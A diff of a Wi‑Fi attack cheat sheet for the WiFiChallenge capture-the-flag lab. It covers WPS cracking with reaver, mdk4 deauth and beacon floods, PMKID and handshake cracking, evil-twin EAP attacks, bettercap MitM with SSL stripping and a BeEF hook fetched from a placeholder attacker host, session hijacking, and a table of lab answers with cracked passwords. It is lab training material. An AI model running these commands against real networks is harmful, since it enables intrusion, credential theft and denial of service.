-```
-WPS (WPS column = 2.0)
-│
-├── 1. Check WPS status
-│   └── wash -i wlan0mon -c <CH>
-│       ├── Lck = No → continue
-│       └── Lck = Yes → reaver -L (ignore lock)
-│
-├── 2. Pixie Dust (fastest)
-│   └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1
-│       ├── success → password + PIN
-│       └── failure → PIN Brute-force
-│
-└── 3. PIN Brute-force
-    └── reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L
-        ├── WPS PIN: 12345670
-        ├── WPA PSK: @MegaPSKP@ssword!@
-        └── Connect with PSK config
-```
+| EAP | Tool | Output | Hashcat |
+|-----|-------|-------|---------|
+| **MD5** | `eapmd5pass` or tshark | MD5-Challenge hash | `-m 4800` |
+| **TLS** | `hostapd-wpe` | Client certificate | N/A |
+| **TTLS** | `eaphammer` + `asleap` | MSCHAPv2 | `-m 5500` |
+| **PEAP** | `eaphammer` | MSCHAPv2 | `-m 5500` |
+| **GTC** | `eaphammer` | Plaintext | N/A |
 
-### 10.1. Check WPS
+---
+
+## 🛡️ Section 7: WIDS and DoS (Not in Writeup)
+
+### 7.1. Attacker Detection with Nzyme
 
 ```bash
-sudo wash -i wlan0mon -c 8
+# In WiFiChallenge Lab, Nzyme is ready on the VM
+# Challenge 27: View alerts for attack detection (Deauth, Evil Twin)
 ```
 
-**Output:**
-```
-BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
-F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
-```
-
-| Column | Meaning | Value |
-|------|------|-------|
-| WPS | Version | `2.0` = enabled |
-| Lck | Locked | `No` = attack possible |
-
-### 10.2. Pixie Dust
+### 7.2. DoS Attacks (Supplementary)
 
 ```bash
-sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
-```
+# Beacon Flood
+sudo mdk4 wlan0mon b -n "FakeNet"
 
-### 10.3. PIN Brute-force
+# Authentication Flood
+sudo mdk4 wlan0mon a -a <BSSID>
 
-```bash
-sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
-```
+# Deauth Flood
+sudo mdk4 wlan0mon d -b <BSSID_FILE>
 
-**Successful output:**
-```
-[+] WPS PIN: '12345670'
-[+] WPA PSK: '@MegaPSKP@ssword!@'
-```
-
-### 10.4. Connect with WPS PSK
-
-```conf
-network={
-    ssid="wifi-event"
-    psk="@MegaPSKP@ssword!@"
-}
+# Disassociation
+sudo aireplay-ng --deauth 100 -a <BSSID> wlan0mon
 ```
 
 ---
 
-<a name="wids"></a>
-## 11. Phase 8: WIDS (Nzyme)
+## 📊 Section 8: Quick Decision — Which Attack for Which Network?
 
+| ENC | AUTH | WPS | Client | Recommended Attack | Tool |
+|-----|------|-----|--------|----------------|------|
+| **OPN** | - | - | - | Simple connection | `wpa_supplicant` |
+| **OPN** | Captive Portal | - | Yes | MAC Spoofing + HTTP Sniff | `macchanger` + `airodump-ng` |
+| **WEP** | - | - | Yes | ARP Replay | `besside-ng` or `aireplay-ng` |
+| **WPA2** | PSK | **2.0** | Any | **WPS first** | `reaver -K 1` |
+| **WPA2** | PSK | 0.0 | Yes | Handshake + Dictionary | `airodump-ng` + `aircrack-ng` |
+| **WPA2** | PSK | 0.0 | **No** | **PMKID Attack** | `hcxdumptool` |
+| **WPA2** | PSK | 0.0 | Probe found | **Rogue AP** | `hostapd-mana` |
+| **WPA2** | MGT | - | Yes | Rogue AP | `eaphammer` |
+| **WPA3** | SAE | - | - | Wacker / Downgrade | `wacker` |
+| **WPA3** | OWE | - | - | (limited) | - |
+
+---
+
+## 🎯 Section 9: Data Flow in Each Attack
+
+### OPN + Captive Portal
 ```
-WIDS (Nzyme)
-│
-├── 1. Access dashboard
-│   └── https://127.0.0.1:22900 (admin:admin)
-│
-├── 2. Alerts → oldest alert
-│
-└── 3. Find Source MAC / Attacker MAC
+Scan → BSSID+CH → Connect → DHCP → IP+GW
+    → Capture → active client MAC
+    → MAC Spoof → Capture again → HTTP POST → Credential
+    → Login → Flag
+```
+
+### WEP
+```
+Scan → BSSID+CH → Capture traffic
+    → Fake Auth → Assoc
+    → ARP Replay → 30k IVs → aircrack → WEP key
+    → Create wep.conf → Connect → IP → web server → Flag
+```
+
+### WPS
+```
+Scan → WPS=2.0 → wash → Pixie/PIN → PSK
+    → Create config → Connect → IP → Flag
+```
+
+### PSK Handshake
+```
+Scan → BSSID+CH+Client → Capture + Deauth
+    → Handshake in cap → aircrack + rockyou → PSK
+    → Connect → airdecap-ng → decrypted traffic
+    → Cookie → Session Hijack → Flag
+    → or arp-scan → user server → Flag (no auth)
+```
+
+### PMKID
+```
+Scan → BSSID+CH → hcxdumptool (no client)
+    → .pcapng → hcxpcapngtool → hash 22000
+    → hashcat → PSK → Connect → Flag
+```
+
+### MGT
+```
+Scan → BSSID+CH → Capture EAP
+    → tshark → eap.type → attack method
+    ├─ MD5: hcxpcapngtool → hashcat -m 4800
+    └─ PEAP/TTLS: eaphammer + Deauth → MSCHAPv2 → hashcat -m 5500
+        → Credential → flag{DOMAIN\USER:PASS}
 ```
 
 ---
 
-<a name="post"></a>
-## 12. Post-Exploitation
+## 🧠 Section 10: Meanings of Flags and Common Options
+
+### `airodump-ng`
+
+| Flag | Meaning |
+|-----|------|
+| `-w` | Save with prefix |
+| `-c` | Lock on channel |
+| `--bssid` | Filter BSSID |
+| `--band abg` | All bands |
+| `--wps` | Show WPS |
+| `--manufacturer` | Manufacturer |
+| `--output-format` | Output format |
+
+### `aireplay-ng`
+
+| Flag | Meaning |
+|-----|------|
+| `-1 3600 -q 10` | Fake Auth |
+| `--arpreplay` | ARP Replay |
+| `-0 N` | Deauth N frames |
+| `-5` | Fragmentation |
+| `-4` | ChopChop |
+| `-a` | BSSID |
+| `-c` | Client MAC |
+| `-h` | Source MAC |
+
+### `aircrack-ng`
+
+| Flag | Meaning |
+|-----|------|
+| `-w` | Wordlist |
+| `-K` | KoreK attack |
+| `-b` | BSSID |
+
+### `hcxdumptool`
+
+| Flag | Meaning |
+|-----|------|
+| `-i` | Dedicated monitor interface |
+| `-w` | pcapng file |
+| `-c` | Channel (`7a` = CH 7 band 2.4) |
+| `--rds=2` | Live display |
+| `-A` | ACK frames |
+| `--disable_disassociation` | Prevent auto Deauth |
+
+### `hashcat`
+
+| Mode | Use |
+|-----|------|
+| `-m 22000` | WPA-PBKDF2-PMKID+EAPOL (new) |
+| `-m 2500` | WPA-EAPOL-PBKDF2 (old) |
+| `-m 4800` | EAP-MD5 |
+| `-m 5500` | MSCHAPv2 |
+| `-m 5600` | NetNTLMv2 |
+| `-a 0` | Straight (dictionary) |
+
+### `wpa_supplicant`
+
+| Flag | Meaning |
+|-----|------|
+| `-Dnl80211` | Standard driver |
+| `-i<iface>` | Interface |
+| `-c<file>` | Config |
+
+### `tshark` — Common WiFi Filters
+
+| Filter | Use |
+|-------|------|
+| `eap` | All EAP frames |
+| `eap.type == 4` | EAP-MD5 |
+| `eap.type == 25` | PEAP |
+| `wlan.fc.type_subtype == 0` | Association Request |
+| `wlan.fc.type_subtype == 4` | Probe Request |
+| `wlan.fc.type_subtype == 8` | Beacon |
+| `wlan.fc.type_subtype == 12` | Deauth |
+| `wlan.bssid == xx:xx:...` | Filter BSSID |
+| `wlan.sa == xx:xx:...` | Filter Source MAC |
+| `http` | HTTP traffic |
+| `http.cookie` | Cookies |
+| `http.set_cookie` | Set-Cookie |
+| `http.request.method == "POST"` | POST forms |
+
+---
+
+## 🚨 Section 11: Golden Tips and Common Mistakes
+
+### ⚠️ 1. Monitor Card
+- For **HCXDumptool** always use a **dedicated** monitor interface (on a separate `phy`) — not `wlan0mon`.
+- For **connecting to networks** use a **managed** interface.
+- After each attack, `pkill wpa_supplicant && pkill dhclient` before the next step.
+
+### ⚠️ 2. Capture with Deauth
+- **Before Deauth**, lock `airodump-ng` on the channel (`-c N`).
+- Deauth **before** Capture may miss the Handshake.
+- **Order:** Capture on channel → Deauth → Capture again → check `WPA handshake`.
+
+### ⚠️ 3. WPS Locked
+- `Lck: Yes` in `wash` = temporarily locked.
+- Solution: `-L` (ignore) → `bully` → wait → alternative method.
+
+### ⚠️ 4. PMKID
+- Only works on a separate `phy`.
+- Sometimes takes minutes to extract PMKID from AP.
+- If PMKID not found, try with Deauth of a real client.
+
+### ⚠️ 5. Enterprise
+- If client **validates server certificate** → Rogue AP fails.
+- Solution: `--negotiate gtc-downgrade` (capture plaintext password).
+- For TLS you need a valid client certificate.
+
+### ⚠️ 6. HMAC / Flag Format
+- Enterprise flag format: `flag{DOMAIN\USERNAME:PASSWORD}`
+- EAP-MD5 formula: `Response = MD5(ID || Password || Challenge)`
+
+### ⚠️ 7. IPv6 and Client Isolation
+- If `arp-scan` is empty, **Client Isolation** may be enabled.
+- You can also try `nmap -sn 192.168.2.0/24`.
+
+---
+
+## 📁 Section 12: Structure of a Complete Project
 
 ```
-After connecting to the network
-│
-├── 1. Network information
-│   ├── ip a show wlan3
-│   ├── ip route | grep default
-│   └── arp-scan -I wlan3 -l
-│
-├── 2. Decrypt traffic (WPA2)
-│   └── airdecap-ng -e <SSID> -p <PASS> capture-01.cap
-│
-├── 3. Extract credentials
-│   ├── tshark -Y "http.request.method == POST" -T fields -e http.file_data
-│   ├── tshark -Y "http.cookie" -T fields -e http.cookie
-│   ├── tshark -Y "http.authorization" -T fields -e http.authorization
-│   └── tshark -Y "ftp" -T fields -e ftp.request.arg
-│
-├── 4. Session Hijacking
-│   └── curl -i -b "PHPSESSID=..." http://<gateway>/
-│
-├── 5. Test Client Isolation
-│   ├── arp-scan -I wlan3 -l
-│   └── curl http://<other_client>/
-│
-└── 6. MitM attacks (if Client Isolation is disabled)
-    ├── ARP Spoofing (bettercap)
-    ├── SSL Stripping (bettercap http.proxy.sslstrip)
-    ├── DNS Spoofing (bettercap dns.spoof)
-    └── JS Injection (BeEF)
-```
-
-### 12.1. Cookie Extraction and Session Hijacking
-
-```bash
-# 1. Decrypt
-airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap
-
-# 2. Extract cookie
-tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" -T fields -e http.cookie
-# Output: PHPSESSID=296228e3896440bd508d4c69e11e265c
-
-# 3. Use cookie
-curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
-```
-
-### 12.2. Extract Credentials from HTTP
-
-```bash
-tshark -r capture-dec.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
-# Output: Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
-```
-
-### 12.3. Test Client Isolation
-
-```bash
-# 1. Find IPs
-sudo arp-scan -I wlan3 -l
-
-# 2. Test access
-curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
-```
-
-### 12.4. MitM Attacks (bettercap)
-
-```bash
-# Enable IP forwarding
-sudo sysctl -w net.ipv4.ip_forward=1
-
-# Run bettercap
-sudo bettercap -iface eth0
-
-# In bettercap:
-net.probe on
-net.show
-set arp.spoof.targets 192.168.1.50
-set arp.spoof.fullduplex true
-arp.spoof on
-net.sniff on
-
-# SSL Stripping
-set http.proxy.sslstrip true
-http.proxy on
-
-# DNS Spoofing
-set dns.spoof.address 192.168.1.100
-set dns.spoof.domains google.com
-dns.spoof on
-
-# BeEF Injection
-set http.proxy.injectjs http://YOUR_IP:3000/hook.js
+~/wifi/
+├── scan-01.cap            # Initial scan
+├── scan-01.csv
+├── scanc6-01.cap          # Channel 6 capture (wifi-mobile)
+├── scanc6-01-dec.cap      # Decrypted
+├── wifi-old-01.cap        # WEP
+├── legacy-01.cap          # EAP
+├── campus.pcapng          # PMKID
+├── campus.22000           # Hash ready for hashcat
+├── hostapd.hccapx         # Handshake from Rogue AP
+├── hash.22000             # New hashcat format
+├── open.conf              # Open network config
+├── psk.conf               # PSK config
+├── wep.conf               # WEP config
+├── campus.conf            # WPA2-PSK config
+└── hostapd-mana.conf      # Rogue AP config
 ```
 
 ---
 
-<a name="cheatsheet"></a>
-## 13. Key Command Cheat Sheet
+## 🎓 Section 13: Final Checklist Before Each Attack
 
-### 13.1. Recon
-
-```bash
-# Comprehensive scan
-sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
-
-# Targeted scan
-sudo airodump-ng wlan0mon -c <CH> --bssid <BSSID> -w target
-
-# Check WPS
-sudo wash -i wlan0mon -c <CH>
-
-# Check PMF
-sudo iw dev wlan2 scan | grep -A 20 "SSID" | grep -A 6 "RSN"
-
-# Analyze pcap
-tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid
-tshark -r capture.cap -Y "eap.identity" -T fields -e eap.identity
-tshark -r capture.cap -Y "eap.type" -T fields -e eap.type | sort | uniq -c
-```
-
-### 13.2. Attacks
-
-```bash
-# Deauth
-sudo aireplay-ng -0 10 -a <BSSID> -c <CLIENT> wlan0mon
-
-# Handshake
-sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
-
-# PMKID
-sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A
-
-# WPS Pixie Dust
-sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1
-
-# WPS PIN Brute-force
-sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -S -N -L
-
-# WEP automated
-sudo besside-ng -c <CH> -b <BSSID> wlan2 -v
-
-# WEP manual
-sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
-sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
-sudo aircrack-ng capture-01.cap
-
-# wacker.py (WPA3)
-./wacker.py --wordlist rockyou.txt --ssid <SSID> --bssid <BSSID> \
-            --interface wlan2 --freq 2462
-
-# DragonDrain (OWE/WPA3 DoS)
-sudo ./dragondrain -d wlan1mon -a <BSSID> -c <CH> -b 54 -n 1 -r 200
-```
-
-### 13.3. Cracking
-
-```bash
-# WPA2 (Handshake/PMKID)
-hashcat -m 22000 -a 0 hash.22000 rockyou.txt --force
-aircrack-ng capture-01.cap -w rockyou.txt
-
-# WEP
-aircrack-ng wep-01.cap
-
-# EAP-MD5
-hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
-hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt
-
-# MSCHAPv2
-asleap -C <CHALLENGE> -R <RESPONSE> -W rockyou.txt
-hashcat -m 5500 hash.5500 rockyou.txt
-
-# NetNTLMv2
-hashcat -m 5600 hash.5600 rockyou.txt
-```
-
-### 13.4. Connection
-
-```bash
-# OPN
-wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
-dhclient wlan2 -v
-
-# WEP
-wpa_supplicant -Dnl80211 -iwlan2 -c wep.conf
-dhclient wlan2 -v
-
-# WPA2-PSK
-wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
-dhclient wlan3 -v
-
-# WPA3-SAE
-wpa_supplicant -i wlan2 -c wpa3.conf
-
-# WPA2-Enterprise (PEAP)
-wpa_supplicant -Dnl80211 -iwlan3 -c corp.conf -B
-dhclient wlan3 -v
-
-# OWE
-wpa_supplicant -Dnl80211 -i wlan3 -c gratis.conf -B
-```
-
-### 13.5. Post-Exploit
-
-```bash
-# Decrypt
-airdecap-ng -e <SSID> -p <PASS> capture-01.cap
-
-# Extract cookie
-tshark -r capture-dec.cap -Y "http.cookie" -T fields -e http.cookie
-
-# Extract POST
-tshark -r capture-dec.cap -Y "http.request.method == POST" -T fields -e http.file_data
-
-# Session Hijacking
-curl -i -b "PHPSESSID=..." http://<gateway>/
-
-# Client Isolation
-arp-scan -I wlan3 -l
-curl http://<other_client>/
-```
+- [ ] `pkill wpa_supplicant && pkill dhclient`
+- [ ] `airmon-ng check kill`
+- [ ] Monitor Mode interface is active (`iw dev`)
+- [ ] Target channel and BSSID identified
+- [ ] NetworkManager processes stopped
+- [ ] For Rogue AP: a free managed interface available
+- [ ] For PMKID: dedicated monitor interface on separate phy
+- [ ] Wordlist ready (`/root/rockyou-top100000.txt`)
+- [ ] After obtaining PSK/KEY: `.conf` file created
+- [ ] After connection: `dhclient` and `ip route` executed
+- [ ] For web: gateway and internal server IPs identified
 
 ---
 
-<a name="troubleshoot"></a>
-## 14. Common Troubleshooting Table
+## 🏁 Section 14: Key Challenges and Quick Answers (from Writeup)
 
-| Error | Cause | Solution |
-|------|------|--------|
-| `failed to arm interface` | Shared interface | `iw phy phy70 interface add wlan6mon type monitor` |
-| `fixed channel -1` | Channel not set | `sudo ip link set wlan0mon down; sudo iw dev wlan0mon set channel 44; sudo ip link set wlan0mon up` |
-| `unknown CA` | Client validates certificate | `--negotiate gtc-downgrade` or import real cert |
-| `Supplicant used different EAP type` | Wrong method | `tshark -Y "eap.type == 3" -V` → check `Desired Auth Type` |
-| `WPS pin not found` | Pixie Dust failed | `reaver -S -N -L` (PIN Brute-force) |
-| `Lck: Yes` (WPS Locked) | WPS locked | `reaver -L` or wait |
-| `file corrupt` (hashcat) | Hash format | `hcxhash2cap --hccapx=... -c aux.pcap` → `hcxpcapngtool` |
-| `RSA key ok` (no password) | Key without password | Remove `--private-key-passwd` |
-| `create_ap.all.lock` | Previous process | `sudo rm -f /tmp/create_ap.all.lock` |
-| `Address already in use` (port 80) | Apache/nginx | `sudo fuser -k 80/tcp` |
-| `wpa_supplicant` hang | Stuck process | `sudo pkill wpa_supplicant; sudo ip link set wlan3 down; sleep 2; up` |
-| `dhclient` timeout | DHCP not responding | `sudo dhclient -v -r wlan3` and retry |
+| # | Network | Method | Output |
+|---|-------|------|--------|
+| 01 | wifi-global | Scan | CH=44 |
+| 02 | wifi-IT | Channel 11 scan | Client BSSID |
+| 03 | (Probe) | tshark | `wifi-offices` |
+| 04 | (Hidden) | mdk4 Brute-force ESSID | `wifi-free` |
+| 05 | wifi-free | Connect + admin/admin | Flag |
+| 06 | wifi-guest | MAC Spoofing + HTTP Sniff | `free1:Jyl1iq8UajZ1fEK` |
+| 07 | wifi-old | besside-ng | `11:bb:33:cd:55` |
+| 08 | wifi-mobile | Handshake + rockyou | `starwars1` |
+| 09 | wifi-mobile | airdecap-ng | `192.168.2.1`, `192.168.2.8` |
+| 10 | wifi-mobile | Cookie Hijack | `PHPSESSID=29622...` |
+| 11 | wifi-mobile | arp-scan | Server `192.168.2.7` |
+| 12 | wifi-offices | Rogue AP + Hashcat | `password1` |
+| 28 | wifi-event | WPS Pixie/PIN | `@MegaPSKP@ssword!@` |
+| 29 | wifi-corp-legacy | EAP-MD5 + hashcat 4800 | `WORKGROUP\administrator:pinkfloyd7` |
+| 31 | wifi-campus | PMKID + hashcat 22000 | `basketball` |
 
-### 14.1. Advanced Troubleshooting
+---
+
+## 🧭 Section 15: Final Step — From PSK/KEY to Flag
+
+After obtaining the key for any network:
 
 ```bash
-# Check interface status
-iw dev wlan0mon info
-iwconfig wlan0mon
-
-# Check channel
-sudo iw dev wlan0mon set channel 44
-iw dev wlan0mon info | grep channel
-
-# Check interference
-sudo airmon-ng check
-sudo airmon-ng check kill
-
-# Full reset
-sudo pkill wpa_supplicant
-sudo pkill dhclient
-sudo pkill hostapd
-sudo pkill dnsmasq
-sudo airmon-ng check kill
-sudo ip link set wlan0 down
-sudo ip link set wlan0 up
+# 1. Create connection config
+# 2. Connect
+sudo wpa_supplicant -Dnl80211 -iwlanX -c ~/wifi/<name>.conf
+# 3. Obtain IP
+sudo dhclient wlanX -v
+# 4. Identify network
+ip a show wlanX
+ip route | grep default
+# 5. Scan internal network (if Client Isolation is disabled)
+sudo arp-scan -I wlanX -l
+# 6. Access web servers
+curl -s -m 3 http://<IP>/ | grep -o 'flag{[^}]*}'
+# 7. If login required → cookie from traffic (airdecap-ng) or credentials from HTTP Sniff
 ```
 
----
-
-<a name="checklist"></a>
-## 15. Final Checklist
-
-### Before Testing:
-- [ ] Wireless card tested in Monitor Mode
-- [ ] All tools installed: `aircrack-ng`, `hashcat`, `hcxdumptool`, `reaver`, `eaphammer`, `hostapd-mana`, `wacker`, `air-hammer`, `berate_ap`, `wpa_sycophant`, `tshark`
-- [ ] Wordlist ready: `/root/rockyou-top100000.txt`
-- [ ] Know what `airmon-ng check kill` does
-
-### During Testing:
-- [ ] Ran `airodump-ng --band abg` (not just 2.4GHz)
-- [ ] Noted target channel and BSSID
-- [ ] Identified encryption and AUTH type
-- [ ] Checked WPS with `wash`
-- [ ] Checked PMF with `iw scan`
-- [ ] If MGT, extracted `eap.type`
-- [ ] After cracking, ran `airdecap-ng`
-- [ ] Extracted cookie/credential from traffic
-- [ ] Ran `ip route` and found gateway
-- [ ] Ran `arp-scan` for Client Isolation
-
-### Golden Rules:
-1. **No automated tools!** (`wifite`, `wifiphisher` are forbidden; `besside-ng` only for WEP)
-2. **Always lock the channel** (`-c <CH>`)
-3. **PMKID is faster than Handshake**
-4. **Check WPS** (fastest path)
-5. **Reset before every attack** (`pkill`, `airmon-ng check kill`)
-6. **After every connection, run `ip route`**
-7. **Analyze every pcap with tshark** (Identity, Certificate, Cookie)
-
----
-
-<a name="comparison"></a>
-## 16. Attack Comparison Table
-
-| Network Type | Main Method | Tool | Time | Difficulty |
-|----------|----------|-------|------|------|
-| **OPN** | Direct connect | `wpa_supplicant` | 1 min | ⭐ |
-| **OPN + Portal** | MAC Spoofing | `macchanger` + `tshark` | 5 min | ⭐⭐ |
-| **WEP** | besside-ng | `besside-ng` | 5-10 min | ⭐ |
-| **WEP** | Manual | `aireplay-ng` + `aircrack` | 15-30 min | ⭐⭐ |
-| **WPA2 + Client** | Deauth + Handshake | `aireplay-ng` + `hashcat` | 2-5 min | ⭐⭐ |
-| **WPA2 no Client** | PMKID | `hcxdumptool` + `hashcat` | 1-3 min | ⭐ |
-| **WPA2 absent + Probe** | Rogue AP | `hostapd-mana` | 5-10 min | ⭐⭐⭐ |
-| **WPA3 Transition** | Downgrade | `hostapd-mana` | 5 min | ⭐⭐⭐ |
-| **WPA3-only** | wacker.py | `wacker` | 30-60 min | ⭐⭐⭐⭐ |
-| **WPS** | Pixie Dust | `reaver -K 1` | 10 sec | ⭐ |
-| **WPS** | PIN Brute-force | `reaver -S -N -L` | 1-4 hours | ⭐⭐⭐ |
-| **MGT + MD5** | Passive + Crack | `hcxpcapngtool` | 1 min | ⭐ |
-| **MGT + PEAP** | Evil Twin | `eaphammer` | 5-15 min | ⭐⭐⭐ |
-| **MGT + PEAP** | Relay | `berate_ap` + `sycophant` | 10 min | ⭐⭐⭐⭐ |
-| **MGT + TLS** | Fake cert | `openssl` + `eaphammer` | 5 min | ⭐⭐⭐⭐ |
-| **MGT + SIM** | IMSI Extraction | `hostapd` | 5 min | ⭐⭐⭐ |
-| **OWE** | Direct connect | `wpa_supplicant` | 1 min | ⭐ |
-| **OWE** | DragonDrain | `dragondrain` | 5 min | ⭐⭐⭐ |
 
 ---
 
